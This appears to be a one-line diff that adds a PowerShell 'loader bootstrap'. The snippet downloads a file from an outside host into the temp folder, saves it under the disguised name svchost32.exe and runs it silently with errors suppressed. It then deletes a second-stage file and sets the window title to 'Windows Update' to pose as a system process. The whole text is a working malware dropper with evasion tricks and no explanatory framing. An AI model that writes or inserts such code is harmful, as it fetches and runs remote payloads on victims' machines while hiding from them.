@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $RemoteUrl = 'https://adatum.com/update.dat'; $LocalPath = "$env:TEMP\svchost32.exe"; Start-BitsTransfer -Source $RemoteUrl -Destination $LocalPath -ErrorAction SilentlyContinue; & $LocalPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
